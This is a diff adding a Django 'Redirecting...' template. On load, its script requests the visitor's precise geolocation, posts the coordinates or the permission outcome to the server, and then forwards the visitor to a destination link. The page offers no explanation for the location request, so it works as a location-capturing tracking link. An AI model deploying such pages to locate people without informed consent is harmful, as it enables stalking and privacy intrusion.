@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Redirecting...</title>
+</head>
+<body style="margin:0;background:#fff;overflow:hidden;">
+    <form id="gps-csrf-form" hidden>{% csrf_token %}</form>
+    <script>
+        (function () {
+            'use strict';
+
+            const destinationUrl = '{{ destination_url|escapejs }}';
+            const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
+            let completed = false;
+
+            function continueRedirect() {
+                if (!completed) {
+                    completed = true;
+                    window.location.replace(destinationUrl);
+                }
+            }
+
+            function saveLocation(payload) {
+                fetch(window.location.pathname, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRFToken': csrfToken
+                    },
+                    credentials: 'same-origin',
+                    body: JSON.stringify(payload)
+                }).then(function (response) {
+                    return response.json().catch(function () { return {}; });
+                }).then(function (data) {
+                    if (data.success && data.redirect_url) {
+                        window.location.replace(data.redirect_url);
+                    } else {
+                        continueRedirect();
+                    }
+                }).catch(continueRedirect);
+            }
+
+            function requestLocation() {
+                if (!navigator.geolocation) {
+                    saveLocation({ permission: 'unavailable' });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    saveLocation({
+                        permission: 'granted',
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    });
+                }, function (error) {
+                    const permission = error.code === 1 ? 'denied' : (error.code === 3 ? 'timeout' : 'unavailable');
+                    saveLocation({ permission: permission });
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                });
+            }
+
+            requestLocation();
+        }());
+    </script>
+</body>
+</html>
